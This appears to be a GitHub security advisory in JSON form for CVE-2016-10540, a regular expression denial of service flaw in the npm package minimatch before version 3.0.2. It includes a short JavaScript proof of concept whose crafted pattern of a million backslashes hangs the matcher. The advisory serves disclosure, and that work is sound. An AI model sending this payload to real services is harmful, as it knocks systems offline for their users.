{
  "schema_version": "1.4.0",
  "id": "GHSA-hxm2-r34f-qmc5",
  "modified": "2023-09-11T22:02:05Z",
  "published": "2018-10-09T00:40:41Z",
  "aliases": [
    "CVE-2016-10540"
  ],
  "summary": "Regular Expression Denial of Service in minimatch",
  "details": "Affected versions of `minimatch` are vulnerable to regular expression denial of service attacks when user input is passed into the `pattern` argument of `minimatch(path, pattern)`.\n\n\n## Proof of Concept\n```js\nvar minimatch = require(\u201cminimatch\u201d);\n\n// utility function for generating long strings\nvar genstr = function (len, chr) {\n  var result = \u201c\u201d;\n  for (i=0; i<=len; i++) {\n    result = result + chr;\n  }\n  return result;\n}\n\nvar exploit = \u201c[!\u201d + genstr(1000000, \u201c\\\\\u201d) + \u201cA\u201d;\n\n// minimatch exploit.\nconsole.log(\u201cstarting minimatch\u201d);\nminimatch(\u201cfoo\u201d, exploit);\nconsole.log(\u201cfinishing minimatch\u201d);\n```\n\n\n## Recommendation\n\nUpdate to version 3.0.2 or later.",
  "severity": [
    {
      "type": "CVSS_V3",
      "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
    }
  ],
  "affected": [
    {
      "package": {
        "ecosystem": "npm",
        "name": "minimatch"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "3.0.2"
            }
          ]
        }
      ]
    }
  ],
  "references": [
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2016-10540"
    },
    {
      "type": "ADVISORY",
      "url": "https://github.com/advisories/GHSA-hxm2-r34f-qmc5"
    },
    {
      "type": "WEB",
      "url": "https://www.npmjs.com/advisories/118"
    }
  ],
  "database_specific": {
    "cwe_ids": [
      "CWE-400"
    ],
    "severity": "HIGH",
    "github_reviewed": true,
    "github_reviewed_at": "2020-06-16T21:41:28Z",
    "nvd_published_at": null
  }
}